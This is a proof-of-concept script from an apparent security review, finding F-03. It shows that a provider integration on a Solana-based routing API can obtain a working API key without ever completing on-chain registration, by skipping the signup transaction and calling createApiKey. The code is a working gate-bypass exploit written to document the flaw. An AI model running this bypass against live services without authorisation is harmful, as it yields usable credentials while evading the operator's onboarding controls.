// F-03 — Live API credentials issued for an integration whose on-chain
// provider registration never completed.
//
// Expected (secure): createApiKey should require the integration to be fully
// registered on-chain (providerStatus === "registered", a register signature/slot).
// Actual: startSignup flips the integration to status="active" immediately and
// createApiKey mints a working mh_test_ key even though providerStatus="failed"
// and registerSignature/registerSlot/providerRegisteredAt are all null.
//
// Impact: the on-chain registration (which anchors the provider PDA used for fee
// settlement/accounting and costs rent) can be skipped entirely while still
// obtaining usable API credentials and transacting on the routing API.
//
// Run:  node 03-apikey-without-onchain-registration.mjs
// Needs no SOL and no pre-existing key — this IS the onboarding-gate bypass.
import nacl from "tweetnacl";
import { trpc, rest, siwsAuth, bs58enc, section, line, verdict } from "./_lib.mjs";

// fresh ephemeral wallet so we prove a brand-new, never-registered provider
const raw = nacl.sign.keyPair();
const kp = { secret: Buffer.from(raw.secretKey), address: bs58enc(raw.publicKey) };

section("1. SIWS auth with a brand-new wallet");
const auth = await siwsAuth(kp);
line("authenticated userId:", auth.jwt.userId, "address:", kp.address);

section("2. startSignup (returns an UNSIGNED on-chain registration tx we never broadcast)");
const su = await trpc("integrations.provider.startSignup",
  { name: "secreview-f03", providerWallet: kp.address }, { cookie: auth.cookie });
line("integrationId:", su.data?.data?.integrationId, "providerPda:", su.data?.data?.providerPda);
line("-> we deliberately do NOT sign/broadcast; on-chain registration is skipped");

section("3. createApiKey — should be blocked until on-chain registration completes");
const ck = await trpc("integrations.createApiKey", { mode: "test" }, { cookie: auth.cookie });
const key = ck.data?.data?.key;
line("createApiKey ->", ck.status, key ? "KEY ISSUED: " + key.slice(0, 20) + "…" : JSON.stringify(ck.body));

section("4. integration on-chain state");
const me = await trpc("integrations.me", undefined, { cookie: auth.cookie, method: "GET" });
const i = me.data?.data?.integration || {};
line(JSON.stringify({
  status: i.status, providerStatus: i.providerStatus,
  registerSignature: i.registerSignature, registerSlot: i.registerSlot,
  providerRegisteredAt: i.providerRegisteredAt,
}, null, 2));

section("5. does the key actually work on the REST agentic API?");
let works = false;
if (key) {
  const est = await rest("/transfers/estimate", { method: "POST", apiKey: key, idem: "f03-" + Date.now(),
    body: { tokenMint: "So11111111111111111111111111111111111111112", amountRaw: "100000000", tokenDecimals: 9, tokenPriceUsd: 150, hops: 3 } });
  works = est.status === 200;
  line("/transfers/estimate ->", est.status, "tier=", est.body?.tier);
}

const vuln = !!key && works && i.status === "active" && i.providerStatus !== "registered";
section("VERDICT");
verdict(vuln, "working API key + active integration while providerStatus='" + i.providerStatus + "' and registerSignature=" + i.registerSignature);
process.exit(vuln ? 0 : 1);
